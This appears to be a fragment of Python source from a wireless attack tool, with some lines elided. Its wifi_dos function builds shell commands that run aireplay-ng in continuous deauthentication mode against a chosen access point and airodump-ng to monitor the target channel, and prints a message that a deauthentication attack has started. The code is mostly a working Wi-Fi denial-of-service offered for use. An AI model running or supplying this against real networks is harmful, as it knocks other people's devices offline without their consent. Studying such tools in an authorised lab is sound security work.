...
def wifi_dos():
    try:
        ...
        if com[0:13] == 'set interface':
            ...
            os.system(xterm_1)
            print(wcolors.color.BLUE + "[*]Deauthentication - Dissassocition Attack .... Started." + wcolors.color.ENDC)
            sleep(1)
            ...
            sleep(1)
            xterm_3 = "xterm -e aireplay-ng -0 0 -a " + options[1] + " " + options[3] + " &"
            os.system(xterm_3)
            xterm_4 = "xterm -e airodump-ng -c " + options[4] + " --bssid " + options[1] + " " + options[3] + " &"
            os.system(xterm_4)
